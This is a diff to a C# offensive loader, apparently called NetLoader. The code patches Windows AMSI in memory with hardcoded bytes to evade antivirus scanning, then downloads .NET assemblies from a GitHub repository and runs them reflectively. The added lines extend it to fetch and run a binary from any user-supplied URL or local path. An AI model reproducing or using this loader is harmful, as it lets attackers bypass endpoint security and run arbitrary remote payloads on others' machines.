@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
@@ -32,9 +33,9 @@ public class NetLoader
 
 
         if (System.Environment.Is64BitOperatingSystem)
-            PathAnnsi(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 });
+            PatchAnnsi(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 });
         else
-            PathAnnsi(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 });
+            PatchAnnsi(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 });
 
         while (true)
         {
@@ -48,16 +49,32 @@ public class NetLoader
                 Console.WriteLine("------------------------");
                 for (int count = 0; count < binList.Count; count++)
                 {
-                    Console.WriteLine("[" + (count + 1)+ "] - " + binList[count]);
+                    Console.WriteLine("[" + (count + 1) + "] - " + binList[count]);
 
+                    if (count == binList.Count - 1)
+                    {
+                        Console.WriteLine("[" + (count + 2) + "] - Custom PATH or URL ");
+                    }
                 }
                 Console.WriteLine("-----------------------");
                 Console.WriteLine("[+] Select a binary (number)>");
 
-                    int selectedBin = Convert.ToInt32(Console.ReadLine()) - 1;
+                int selectedBin = Convert.ToInt32(Console.ReadLine()) - 1;
+                if (selectedBin == binList.Count)
+                {
+                    Console.WriteLine("[+] Input your own URL / Local Path / direct link to binary");
+                    string binUrl = Console.ReadLine();
 
-                if (selectedBin > binList.Count | selectedBin < 0)
+                    Console.WriteLine("[+] Provide arguments for {0} >", binUrl);
+                    string binArgs = Console.ReadLine();
+                    invokeBinary("", binArgs, binUrl, false);
+
+
+                }
+                else if (selectedBin > binList.Count | selectedBin < 0)
+                {
                     Console.WriteLine("[!] Not a valid selection!");
+                }
                 else
                 {
                     Console.WriteLine("[+] Provide arguments for {0} >", binList[selectedBin]);
@@ -77,9 +94,28 @@ public class NetLoader
 
 
 
-    public static void invokeBinary(string binName, string arguments = "")
+    public static void invokeBinary(string binName, string arguments = "", string customUrl = "", bool gitHub = true)
     {
-        var binarySource = webClient.DownloadData(_repURL.Replace("tree","blob") + "/" + binName + "?raw=true");
+        byte[] binarySource = new byte[] { };
+
+        if (gitHub)
+        {
+            binarySource = webClient.DownloadData(_repURL.Replace("tree", "blob") + "/" + binName + "?raw=true");
+        }
+        else
+        {
+            if (customUrl.StartsWith("http") && !customUrl.StartsWith("\\\\"))
+            {
+                binarySource = webClient.DownloadData(customUrl);
+            }
+            else
+            {
+                binarySource = File.ReadAllBytes(customUrl);
+             
+            }
+            
+        }
+
 
         System.Reflection.Assembly.Load(binarySource).EntryPoint.Invoke(0, new object[] { new string[] { arguments } });
 
@@ -101,7 +137,7 @@ public class NetLoader
         return avBinaries;
 
     }
-    private static void PathAnnsi(byte[] magicJuice)
+    private static void PatchAnnsi(byte[] magicJuice)
     {
         try
         {
